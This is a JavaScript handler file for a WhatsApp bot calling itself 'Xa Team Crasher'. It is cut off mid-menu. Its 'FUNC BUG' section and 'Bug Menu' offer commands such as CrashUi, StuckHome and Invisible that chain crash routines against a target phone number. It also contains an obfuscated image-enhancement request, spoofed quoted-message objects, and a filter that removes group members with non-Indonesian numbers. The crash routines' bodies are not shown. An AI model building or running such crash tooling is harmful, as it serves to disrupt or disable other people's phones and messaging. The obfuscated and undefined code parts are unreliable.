
const FormData = require('form-data');
const fs = require('fs');
const crypto = require("crypto");
const yts = require('yt-search');
const axios = require('axios');
const jimp = require('jimp');
const util = require('util');
const cheerio = require('cheerio');
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()

module.exports = async (client, m, store) => {
try {
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ""
	
const budy = (typeof m.text == 'string' ? m.text : '') 
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
const makeid = crypto.randomBytes(3).toString('hex')
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const botNumber = await client.decodeJid(client.user.id)
const isDev = m.sender.split("@")[0] == global.owner ? true : m.fromMe ? true : false
const pushname = m.pushName || `${m.sender.split("@")[0]}`
const isBot = botNumber.includes(m.sender)
const Premium = JSON.parse(fs.readFileSync('./database/premium.json'))
const isPremium = Premium.includes(m.sender)
const OwnerR = JSON.parse(fs.readFileSync('./database/owner.json'))
const isOwner = [botNumber, ...OwnerR, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const { runtime, getRandom, getTime, tanggal, toRupiah, telegraPh, pinterest, ucapan, generateProfilePicture, getBuffer, fetchJson, resize, sleep } = require('./lib/function.js')

m.isGroup = m.chat.endsWith("g.us")
m.metadata = m.isGroup ? (await client.groupMetadata(m.chat).catch(_ => {}) || {}) : {}
m.isAdmin = m.metadata && m.metadata.participants ? (m.metadata.participants.find(e => e.admin !== null && e.id == m.sender) || false) : false
m.isBotAdmin = m.metadata && m.metadata.participants ? (m.metadata.participants.find(e => e.admin !== null && e.id == botNumber) || false) : false

//       DATABASE       //
const badwords = JSON.parse(fs.readFileSync('./database/badwords.json'))
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'))
let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'))
let ntasing = JSON.parse(fs.readFileSync('./database/antiasing.json'))
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'))
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'))

const AntiVirtex = m.isGroup ? ntvirtex.includes(m.chat) : false
const AntiWame = m.isGroup ? ntwame.includes(m.chat) : false
const AntiToxic = m.isGroup ? nttoxic.includes(m.chat) : false
const AntiAsing = m.isGroup ? ntasing.includes(m.chat) : false
const AntiLinkAll = m.isGroup ? ntilinkall.includes(m.chat) : false

// ~~~~~~~~ Fake Quoted ~~~~~~~~~~ //

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
        
 function randomNumber() {
const digits = [];
while (digits.length < 6) {
const randomDigit = Math.floor(Math.random() * 10);
if (!digits.includes(randomDigit)) {
digits.push(randomDigit);
}
}
return digits.join("");
}

const reply = (bokep) => { 
    client.sendMessage(m.chat, {
        'text': bokep,
        'contextInfo': {
            'mentionedJid': [m.sender], 
            'forwardingScore': 0x98967f,
            'isForwarded': true,
            'externalAdReply': {
                'showAdAttribution': true,
                'containsAutoReply': true,
                'title': "𝐗𝐚 𝐓𝐞𝐚𝐦 𝐕𝟏𝟎",
                'body': `𝐏𝐨𝐰𝐞𝐫𝐛𝐲 𝐇ᴀᴍᴢx 𝐃ᴇᴠ`,
                'previewType': "PHOTO",
                'thumbnailUrl': 'https://img12.pixhost.to/images/1481/584696430_maulzyhosting.jpg',
                'sourceUrl': 'https://whatsapp.com/channel/0029Vb9vV0m59PwJE7Qm3d19'
            }
        }
    }, {
        'quoted': qkontak // Mengutip pesan sebelumnya
    });
};

    
const qchannel = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {
newsletterAdminInviteMessage: {newsletterJid: `120363419312762647@newsletter`, newsletterName: `𝐇ᴀᴍᴢx 𝐃ᴇᴠ`, jpegThumbnail: "", caption: `𝐗𝐚 𝐓𝐞𝐚𝐦 𝐕𝟏𝟎`, inviteExpiration: 0 }}}
		
const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `𝐗𝐚 𝐓𝐞𝐚𝐦 𝐕𝟏𝟎`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6282186906766:+62 821-8690-6766\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

//remini/hd image
function joaniel(wendolyne, nyier) {
  const enalina = altavious();
  return joaniel = function (laurae, mekelle) {
    laurae = laurae - 127;
    let ralphine = enalina[laurae];
    return ralphine;
  }, joaniel(wendolyne, nyier);
}

function altavious() {
  const jaylenn = ["inferenceengine", "push", "21AoSGqU", "225006xOkcNu", "concat", "472390FPofBK", "4809828vvqtte", "data", "model_version", "3NUOcvQ", "14047187eKUyBb", "error", "3013792ZhnCJd", "okhttp/4.9.3", ".ai/", "enhance_image_body.jpg", "from", "10610670esKiBu", "append", "18nRsxLl", "submit", "https", "image", ".vyro", "image/jpeg", "enhance", "jimp", "24448HhNNWt", "1230ttmiGH", "Keep-Alive"];
  altavious = function () {
    return jaylenn;
  };
  return altavious();
}

async function remini(kyoko, tysa) {
  return new Promise(async (majeed, tamicko) => {
    const deamber = joaniel;
    let milahn = [deamber(153), "recolor", "dehaze"];
    milahn.includes(tysa) ? tysa = tysa : tysa = milahn[0];
    let kymire, nazar = new FormData, lennel = deamber(149) + "://" + deamber(128) + deamber(151) + deamber(142) + tysa;
    nazar[deamber(146)](deamber(136), 1, {"Content-Transfer-Encoding": "binary", contentType: "multipart/form-data; charset=uttf-8"}), nazar[deamber(146)](deamber(150), Buffer[deamber(144)](kyoko), {filename: deamber(143), contentType: deamber(152)}), nazar[deamber(148)]({url: lennel, host: deamber(128) + deamber(151) + ".ai", path: "/" + tysa, protocol: "https:", headers: {"User-Agent": deamber(141), Connection: deamber(127), "Accept-Encoding": "gzip"}}, function (suha, deantoine) {
      const lakeysia = deamber;
      if (suha) tamicko();
      let zyan = [];
      deantoine.on(lakeysia(135), function (spicie, ebunoluwa) {
        const bellaluna = lakeysia;
        zyan[bellaluna(129)](spicie);
      }).on("end", () => {
        const camden = lakeysia;
        majeed(Buffer[camden(132)](zyan));
      }), deantoine.on(lakeysia(139), shady => {
        tamicko();
      });
    });
  });
}

// anti toxic
if (AntiToxic && !budy.includes("deletebadwords") && !budy.includes("delbadwords"))
if (badwords.some(word => budy.toLowerCase().includes(word))){
if (!m.isBotAdmin) return
bvl = `\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\nAdmin bebas menggunakan kata kasar`
if (m.isAdmin) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
await client.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
/*client.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
client.sendMessage(m.chat, {text:`\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\n${pushname} Mohon tidak menggunakan kata kasar di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:qkontak})
} else {
}

if (m.isGroup && m.isBotAdmin && AntiAsing) {
let member = await participants.map((x) => x.id)
for (let i = 0; i < participants.length; i++) {
if (member[i].slice(0, 2) !== "62") {
let usersId = await participants.find((u) => u.id == member[i])
if (!m.isAdmin && !isOwner) {
} else
await client.groupParticipantsUpdate(m.chat, [member[i]], "remove")
await sleep(1000)
}
}
}
if (AntiLinkAll)
if (budy.toLowerCase().includes("http")){
if (!m.isBotAdmin) return
bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`
if (m.isAdmin) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
await client.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
client.sendMessage(m.chat, {text:`\`\`\`「 Link Terdeteksi 」\`\`\`\n\n@${pushname} Jangan kirim link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:qchannel})
} else {
}

 // Antiwame //
if (AntiWame)
if (budy.toLowerCase().includes("wa.me")){
if (!m.isBotAdmin) return
bvl = `\`\`\`「 Wa.me Link Terdeteksi 」\`\`\`\n\nAdmin sudah kirim link wa.me, admin bebas kirim link apapun`
if (m.isAdmin) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
kice = m.sender
await client.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
client.sendMessage(m.chat, {text:`\`\`\`「 Wa.me Link Terdeteksi 」\`\`\`\n\n@${kice.split("@")[0]} Jangan kirim wa.me link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:qchannel})
} else {
}
//antivirtex //
  if (AntiVirtex) {
  if (budy.length > 3500) {
  if (!m.isBotAdmin) return reply(" Bot Bukan Admin ")
  await client.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
client.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
client.sendMessage(m.chat, {text:`\`\`\`「 Virus Terdeteksi 」\`\`\`\n\n${pushname} Telah ditendang karena mengirim virus di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:qchannel})
  }
  }
async function CatBox(filePath) {
	try {
            if (!fs.existsSync(filePath)) {
                throw new Error("File not found");
            }

            const form = new FormData();
            form.append('reqtype', 'fileupload');
            form.append('fileToUpload', fs.createReadStream(filePath));

            const response = await axios.post('https://catbox.moe/user/api.php', form, {
                headers: {
                    ...form.getHeaders()
                }
            });

            if (response.status === 200 && response.data) {
                return response.data.trim(); // Mengembalikan URL file yang diunggah
            } else {
                throw new Error(`Upload failed with status: ${response.status}`);
            }
        } catch (err) {
            throw new Error(`Upload failed: ${err.message}`);
        }
}

//FUNC BUG

async function XaBlankUi(s) {
    await UiCrash1(s) 
    await UiCrash2(s) 
    await UiCrash3(s) 
    await UiCrash4(s) 
    await UiCrash3(s) 
    await UiCrash2(s) 
    await UiCrash1(s)
 }

async function XaDelayMakers(s) {
    await Xa1(s) 
    await Xa2(s) 
    await Xa3(s)
    await XaDelayMaker(s) 
    await Xa3(s) 
    await Xa2(s) 
    await Xa1(s) 
 }
 
async function XaStuckHome(s) {
    await Blanking(s) 
    await nativemsg(s) 
    await FlowButton(s) 
    await CursorimgDoc(s)
    await FlowButton(a) 
    await nativemsg(s) 
    await Blanking(s)
 }
 
async function XaCrash(s) {
   await forclose(s)
   await FlowButton(s) 
   await FlowButton(s) 
   await XaDeviceCrash(s) 
   await FlowX(s) 
   await UiNew(s) 
   await FlowX(s) 
   await FlowButton(s) 
 }
 
async function XaInvis(s) {
  await invisi1(s) 
  await invisi2(s)
  await invisi1(s) 
  await invisi2(s) 
  await invisi1(s) 
  await XaDelayMess(s) 
  await invisi2(s) 
 }
//=====End Function=====\\
        
 if (!client.public) {
if (!m.key.fromMe) return
}
       
const example = async (teks) => {
const commander = ` *Contoh Command :*\n*${cmd}* ${teks}`
return m.reply(commander)
}

const capital = (string) => {
return string.charAt(0).toUpperCase() + string.slice(1);
}

if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), chalk.blue.bold(`[ PESAN ]`), chalk.blue.bold(`FROM`), chalk.blue.bold(`${m.sender.split("@")[0]}`), chalk.blue.bold(`TEXT :`), chalk.blue.bold(`${cmd}`))
}

switch (command) {
case "menu": {
const caption = ` 
hallo👋 ${pushname} Saya Bot Yang Bernama 𝐗𝐚 𝐓𝐞𝐚𝐦 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 Yang Dirancang Khusus! 

╭━━「 \`𝗨𝘀𝗲𝗿 𝗜𝗻𝗳𝗼\`
│ 员 𝑼𝒔𝒆𝒓𝒏𝒂𝒎𝒆 : ${pushname}
│ 员 𝑼𝒔𝒆𝒓 𝑵𝒖𝒎𝒃𝒆𝒓 : ${m.sender.split("@")[0]}
┆ 员 𝑩𝒐𝒕 𝑵𝒂𝒎𝒆 : 𝐗𝐚 𝐓𝐞𝐚𝐦 𝐕𝟏𝟎
┆ 员 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 𝟏𝟎.𝟎.𝟎
┆ 员 𝑴𝒐𝒅𝒆 𝑩𝒐𝒕 : ${client.public ? "Public" : "Self"}

发 \`𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂\` 发
│.𝗔𝗹𝗹𝗠𝗲𝗻𝘂 *ʀᴇᴋᴏᴍᴇɴᴅᴀsɪ*
│.𝗕𝘂𝗴𝗠𝗲𝗻𝘂
│.𝗚𝗿𝗼𝘂𝗽𝗠𝗲𝗻𝘂
│.𝗠𝗮𝗶𝗻𝗠𝗲𝗻𝘂
│.𝗙𝘂𝗻𝗠𝗲𝗻𝘂
│.𝗢𝘄𝗻𝗲𝗿𝗠𝗲𝗻𝘂

© 𝖷𝖺 𝖳𝖾𝖺𝗆 𝖨𝗌 𝖧𝖾𝗋𝖾 🩸
  `
client.sendMessage(m.chat, {
        image: { url: `${global.thumb}` },
	    caption: caption,
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
             title: `𝐗𝐚⃢ 𝐓𝐞𝐚͢𝐦 𝐂𝐫𝐚͢𝐬𝐡𝐞𝐫⃤`,
              body: `© 𝗫𝗵𝗮𝗺𝘇`,
             thumbnailUrl: `${global.thumb2}`,
            sourceUrl: `https://whatsapp.com/channel/0029Vb9vV0m59PwJE7Qm3d19`,
           mediaType: 1,
          renderLargerThumbnail: true
         }
        },
      buttons: [
        { buttonId: ".owner", buttonText: { displayText: "𝕺𝖜𝖓𝖊𝖗" }, type: 1 },
        { buttonId: ".tqto", buttonText: { displayText: "𝕿𝖍𝖆𝖓𝖐𝖘 𝕿𝖔" }, type: 1 },
        {
          buttonId: "action",
          buttonText: { displayText: "𝗣𝗶𝗹𝗶𝗵𝗮𝗻 𝗠𝗲𝗻𝘂" },
          type: 4,
          nativeFlowInfo: {
            name: "single_select",
            paramsJson: JSON.stringify({
              title: "Lihat Semua Menu",
              sections: [
                {
                  title: "𝙓𝙖 𝙏𝙚𝙖𝙢 𝙉𝙚𝙬 𝙀𝙧𝙖 🩸",
                  highlight_label: "ʀᴇᴋᴏᴍᴇɴᴅᴀsɪ",
                  rows: [
                    { 
                  header: "ᴀʟʟ ᴍᴇɴᴜ", 
                  title: "Semua Menu Xa Team", 
                  description: ".", 
                  id: ".allmenu" },                              
                  {
                  header: "ʙᴜɢ ᴍᴇɴᴜ", 
                  title: "Bruttal Bug Xa Team", 
                  description: ".", 
                  id: ".bugmenu" },
                    { 
                  header: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ", 
                  title: "Group Menu Xa Team", 
                  description: ".", 
                  id: ".groupmenu" },                    
                    { 
                  header: "ᴍᴀɪɴ ᴍᴇɴᴜ", 
                  title: "Main Menu Xa Team", 
                  description: ".", 
                  id: ".mainmenu" },
                    {
                  header: "ғᴜɴ ᴍᴇɴᴜ", 
                  title: "Fun Menu Xa Team", 
                  description: ".", 
                  id: ".funmenu" }, 
                  {
                  header: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ", 
                  title: "Owner Menu Xa Team", 
                  description: ".", 
                  id: ".ownermenu" }
                  ]
                }
              ]
            }),
          },
        },
      ], 
      viewOnce: true,
            headerType: 1
        }, { quoted: qchannel });
}
break;
case "allmenu": {
const caption = ` 
hallo👋 ${pushname} Saya Bot Yang Bernama 𝐗𝐚 𝐓𝐞𝐚𝐦 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 Yang Dirancang Khusus! 

╭━━「 \`𝗨𝘀𝗲𝗿 𝗜𝗻𝗳𝗼\`
│ 员 𝑼𝒔𝒆𝒓𝒏𝒂𝒎𝒆 : ${pushname}
│ 员 𝑼𝒔𝒆𝒓 𝑵𝒖𝒎𝒃𝒆𝒓 : ${m.sender.split("@")[0]}
┆ 员 𝑩𝒐𝒕 𝑵𝒂𝒎𝒆 : 𝐗𝐚 𝐓𝐞𝐚𝐦 𝐕𝟏𝟎
┆ 员 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 𝟏𝟎.𝟎.𝟎
┆ 员 𝑴𝒐𝒅𝒆 𝑩𝒐𝒕 : ${client.public ? "Public" : "Self"}

发 \`𝗕𝘂𝗴 𝗠𝗲𝗻𝘂\` 发
│.𝗕𝗹𝗮𝗻𝗸𝗨𝗶 𝟲𝟮𝗫𝗫𝗫
│.𝗗𝗲𝗹𝗮𝘆𝗠𝗮𝗸𝗲𝗿 𝟲𝟮𝗫𝗫𝗫
│.𝗦𝘁𝘂𝗰𝗸𝗛𝗼𝗺𝗲 𝟲𝟮𝗫𝗫𝗫
│.𝗖𝗿𝗮𝘀𝗵𝗨𝗶 𝟲𝟮𝗫𝗫𝗫
│.𝗫𝗮𝗧𝗲𝗮𝗺𝗖𝗿𝗮𝘀𝗵 𝟲𝟮𝗫𝗫𝗫
│.𝗕𝘂𝗴𝗛𝗮𝗿𝗱 𝟲𝟮𝗫𝗫𝗫
│.𝗜𝗻𝘃𝗶𝘀𝗶𝗯𝗹𝗲 𝟲𝟮𝗫𝗫𝗫
│.𝗦𝘆𝘀𝘁𝗲𝗺𝗨𝗶 𝟲𝟮𝗫𝗫𝗫
│.𝗫𝗮𝗖𝗿𝗮𝘀𝗵𝘃𝟭 𝟲𝟮𝗫𝗫𝗫
│.𝗫𝗮𝗖𝗿𝗮𝘀𝗵𝘃𝟮 𝟲𝟮𝗫𝗫𝗫
│.𝗫𝗮𝗖𝗿𝗮𝘀𝗵𝘃𝟯 𝟲𝟮𝗫𝗫𝗫
│.𝗫𝗵𝗮𝗺𝘇 𝟲𝟮𝗫𝗫𝗫
 
发 \`𝗚𝗿𝗼𝘂𝗽 𝗠𝗲𝗻𝘂\` 发
│.𝗔𝗱𝗱𝗕𝗮𝗱𝘄𝗼𝗿𝗱𝘀
│.𝗗𝗲𝗹𝗕𝗮𝗱𝘄𝗼𝗿𝘀
│.𝗔𝗻𝘁𝗶𝗟𝗶𝗻𝗸𝗔𝗹𝗹
│.𝗔𝗻𝘁𝗶𝗧𝗼𝘅𝗶𝗰
│.𝗔𝗻𝘁𝗶𝗪𝗮𝗺𝗲
│.𝗔𝗻𝘁𝗶𝗔𝘀𝗶𝗻𝗴
│.𝗔𝗻𝘁𝗶𝗩𝗶𝗿𝘂𝘀
│.𝗛𝗶𝗱𝗲𝘁𝗮𝗴
│.𝗢𝗽𝗲𝗻
│.𝗖𝗹𝗼𝘀𝗲
│.𝗞𝗶𝗰𝗸 [ @ ]
│.𝗔𝗻𝘁𝗶𝗧𝗮𝗴𝗚𝗿𝗼𝘂𝗽
 
发 \`𝗠𝗮𝗶𝗻 𝗠𝗲𝗻𝘂\` 发
│.𝗦𝗲𝗿𝘁𝗶𝗳𝗶𝗸𝗮𝘁𝗧𝗼𝗹𝗼𝗹
│.𝗕𝗿𝗮𝘁
│.𝗦𝘁𝗶𝗰𝗸𝗲𝗿
│.𝗣𝗹𝗮𝘆
│.𝗖𝗲𝗸𝗜𝗱𝗖𝗵
│.𝗧𝗼𝘂𝗿𝗹
│.𝗛𝗱
│.𝗞𝘁𝗽𝗠𝗮𝗸𝗲𝗿
│.𝗣𝗿𝗲𝘀𝗲𝘁𝗔𝗺
│.𝗦𝗶𝗳𝗮𝘁
│.𝗔𝗿𝘁𝗶𝗠𝗶𝗺𝗽𝗶
│.𝗔𝗿𝘁𝗶𝗡𝗮𝗺𝗮

发 \`𝗙𝘂𝗻 𝗠𝗲𝗻𝘂\` 发
│.𝗖𝗲𝗸𝗖𝗮𝗻𝘁𝗶𝗸
│.𝗖𝗲𝗸𝗞𝗼𝗱𝗮𝗺
│.𝗖𝗲𝗸𝗗𝗼𝗻𝗴𝗼
│.𝗞𝗶𝘀𝗮𝗵𝗡𝗮𝗯𝗶
│.𝗠𝘂𝘀𝗹𝗶𝗺𝗔𝗶
│.𝗔𝗻𝗶𝗺𝗲𝗡𝗲𝗸𝗼
│.𝗔𝗻𝗶𝗺𝗲𝗣𝗮𝘁
│.𝗔𝗻𝗶𝗺𝗲𝗦𝗹𝗮𝗽
│.𝗔𝗻𝗶𝗺𝗲𝗖𝘂𝗱𝗱𝗹𝗲
│.𝗤𝘂𝗲𝘁𝗲𝘀𝗛𝗮𝗰𝗸𝗲𝗿
│.𝗤𝘂𝗲𝘁𝗲𝘀𝗚𝗼𝗺𝗯𝗮𝗹
│.𝗤𝘂𝗲𝘁𝗲𝘀𝗚𝗮𝗹𝗮𝘂
│.𝗤𝘂𝗲𝘁𝗲𝘀𝗠𝗼𝘁𝗶𝘃𝗮𝘀𝗶

发 \`𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂\` 发
│.𝗔𝗱𝗱𝗣𝗿𝗲𝗺 𝟼𝟸𝟾𝚡𝚡𝚡
│.𝗗𝗲𝗹𝗣𝗿𝗲𝗺 𝟼𝟸𝟾𝚡𝚡𝚡
│.𝗔𝗱𝗱𝗢𝘄𝗻𝗲𝗿 𝟼𝟸𝟾𝚡𝚡𝚡
│.𝗗𝗲𝗹𝗢𝘄𝗻𝗲𝗿 𝟼𝟸𝟾𝚡𝚡𝚡
│.𝗣𝘂𝗯𝗹𝗶𝗰
│.𝗦𝗲𝗹𝗳

© 𝖷𝖺 𝖳𝖾𝖺𝗆 𝖨𝗌 𝖧𝖾𝗋𝖾🩸
`
client.sendMessage(m.chat, {
        image: { url: `${global.thumb}` },
	    caption: caption,
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
             title: `𝐗𝐚⃢ 𝐓𝐞𝐚͢𝐦 𝐂𝐫𝐚͢𝐬𝐡𝐞𝐫⃤`,
              body: `© 𝗫𝗵𝗮𝗺𝘇`,
             thumbnailUrl: `${global.thumb2}`,
            sourceUrl: `https://whatsapp.com/channel/0029Vb9vV0m59PwJE7Qm3d19`,
           mediaType: 1,
          renderLargerThumbnail: true
         }
        },
      buttons: [
        { buttonId: ".menu", buttonText: { displayText: "𝕭𝖆𝖈𝖐 𝕸𝖊𝖓𝖚" }, type: 1 }
      ], 
      viewOnce: true,
            headerType: 1
        }, { quoted: qchannel });
}
break;

case "bugmenu": {
const caption = ` 
hallo👋 ${pushname} Saya Bot Yang Bernama 𝐗𝐚 𝐓𝐞𝐚𝐦 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 Yang Dirancang Khusus! 

╭━━「 \`𝗨𝘀𝗲𝗿 𝗜𝗻𝗳𝗼\`
│ 员 𝑼𝒔𝒆𝒓𝒏𝒂𝒎𝒆 : ${pushname}
│ 员 𝑼𝒔𝒆𝒓 𝑵𝒖𝒎𝒃𝒆𝒓 : ${m.sender.split("@")[0]}
┆ 员 𝑩𝒐𝒕 𝑵𝒂𝒎𝒆 : 𝐗𝐚 𝐓𝐞𝐚𝐦 𝐕𝟏𝟎
┆ 员 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 𝟏𝟎.𝟎.𝟎
┆ 员 𝑴𝒐𝒅𝒆 𝑩𝒐𝒕 : ${client.public ? "Public" : "Self"}

发 \`𝗕𝘂𝗴 𝗠𝗲𝗻𝘂\` 发
│.𝗕𝗹𝗮𝗻𝗸𝗨𝗶 𝟲𝟮𝗫𝗫𝗫
│.𝗗𝗲𝗹𝗮𝘆𝗠𝗮𝗸𝗲𝗿 𝟲𝟮𝗫𝗫𝗫
│.𝗦𝘁𝘂𝗰𝗸𝗛𝗼𝗺𝗲 𝟲𝟮𝗫𝗫𝗫
│.𝗖𝗿𝗮𝘀𝗵𝗨𝗶 𝟲𝟮𝗫𝗫𝗫
│.𝗫𝗮𝗧𝗲𝗮𝗺𝗖𝗿𝗮𝘀𝗵 𝟲𝟮𝗫𝗫𝗫
│.𝗕𝘂𝗴𝗛𝗮𝗿𝗱 𝟲𝟮𝗫𝗫𝗫
│.𝗜𝗻𝘃𝗶𝘀𝗶𝗯𝗹𝗲 𝟲𝟮𝗫𝗫𝗫
│.𝗦𝘆𝘀𝘁𝗲𝗺𝗨𝗶 𝟲𝟮𝗫𝗫𝗫
│.𝗫𝗮𝗖𝗿𝗮𝘀𝗵𝘃𝟭 𝟲𝟮𝗫𝗫𝗫
│.𝗫𝗮𝗖𝗿𝗮𝘀𝗵𝘃𝟮 𝟲𝟮𝗫𝗫𝗫
│.𝗫𝗮𝗖𝗿𝗮𝘀𝗵𝘃𝟯 𝟲𝟮𝗫𝗫𝗫
│.𝗫𝗵𝗮𝗺𝘇 𝟲𝟮𝗫𝗫𝗫

© 𝖷𝖺 𝖳𝖾𝖺𝗆 𝖨𝗌 𝖧𝖾𝗋𝖾 🩸
 `
client.sendMessage(m.chat, {
        image: { url: `${global.thumb}` },
	    caption: caption,
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
             title: `𝐗𝐚⃢ 𝐓𝐞𝐚͢𝐦 𝐂𝐫𝐚͢𝐬𝐡𝐞𝐫⃤`,
              body: `© 𝗫𝗵𝗮𝗺𝘇`,
             thumbnailUrl: `${global.thumb2}`,
            sourceUrl: `https://whatsapp.com/channel/0029Vb9vV0m59PwJE7Qm3d19`,
           mediaType: 1,
          renderLargerThumbnail: true
         }
        },
      buttons: [
        { buttonId: ".menu", buttonText: { displayText: "𝕭𝖆𝖈𝖐 𝕸𝖊𝖓𝖚" }, type: 1 }
      ], 
      viewOnce: true,
            headerType: 1
        }, { quoted: qchannel });
}
break;
case "mainmenu": {
const caption = ` 
hallo👋 ${pushname} Saya Bot Yang Bernama 𝐗𝐚 𝐓𝐞𝐚𝐦 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 Yang Dirancang Khusus! 

╭━━「 \`𝗨𝘀𝗲𝗿 𝗜𝗻𝗳𝗼\`
│ 员 𝑼𝒔𝒆𝒓𝒏𝒂𝒎𝒆 : ${pushname}
│ 员 𝑼𝒔𝒆𝒓 𝑵𝒖𝒎𝒃𝒆𝒓 : ${m.sender.split("@")[0]}
┆ 员 𝑩𝒐𝒕 𝑵𝒂𝒎𝒆 : 𝐗𝐚 𝐓𝐞𝐚𝐦 𝐕𝟏𝟎
┆ 员 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 𝟏𝟎.𝟎.𝟎
┆ 员 𝑴𝒐𝒅𝒆 𝑩𝒐𝒕 : ${client.public ? "Public" : "Self"}

发 \`𝗠𝗮𝗶𝗻 𝗠𝗲𝗻𝘂\` 发
│.𝗦𝗲𝗿𝘁𝗶𝗳𝗶𝗸𝗮𝘁𝗧𝗼𝗹𝗼𝗹
│.𝗕𝗿𝗮𝘁
│.𝗦𝘁𝗶𝗰𝗸𝗲𝗿
│.𝗣𝗹𝗮𝘆
│.𝗖𝗲𝗸𝗜𝗱𝗖𝗵
│.𝗧𝗼𝘂𝗿𝗹
│.𝗛𝗱
│.𝗞𝘁𝗽𝗠𝗮𝗸𝗲𝗿
│.𝗣𝗿𝗲𝘀𝗲𝘁𝗔𝗺
│.𝗦𝗶𝗳𝗮𝘁
│.𝗔𝗿𝘁𝗶𝗠𝗶𝗺𝗽𝗶
│.𝗔𝗿𝘁𝗶𝗡𝗮𝗺𝗮

© 𝖷𝖺 𝖳𝖾𝖺𝗆 𝖨𝗌 𝖧𝖾𝗋𝖾 🩸
 `
client.sendMessage(m.chat, {
        image: { url: `${global.thumb}` },
	    caption: caption,
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
             title: `𝐗𝐚⃢ 𝐓𝐞𝐚͢𝐦 𝐂𝐫𝐚͢𝐬𝐡𝐞𝐫⃤`,
              body: `© 𝗫𝗵𝗮𝗺𝘇`,
             thumbnailUrl: `${global.thumb2}`,
            sourceUrl: `https://whatsapp.com/channel/0029Vb9vV0m59PwJE7Qm3d19`,
           mediaType: 1,
          renderLargerThumbnail: true
         }
        },
      buttons: [
        { buttonId: ".menu", buttonText: { displayText: "𝕭𝖆𝖈𝖐 𝕸𝖊𝖓𝖚" }, type: 1 }
      ], 
      viewOnce: true,
            headerType: 1
        }, { quoted: qchannel });
}
break;

case "funmenu": {
const caption = ` 
hallo👋 ${pushname} Saya Bot Yang Bernama 𝐗𝐚 𝐓𝐞𝐚𝐦 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 Yang Dirancang Khusus! 

╭━━「 \`𝗨𝘀𝗲𝗿 𝗜𝗻𝗳𝗼\`
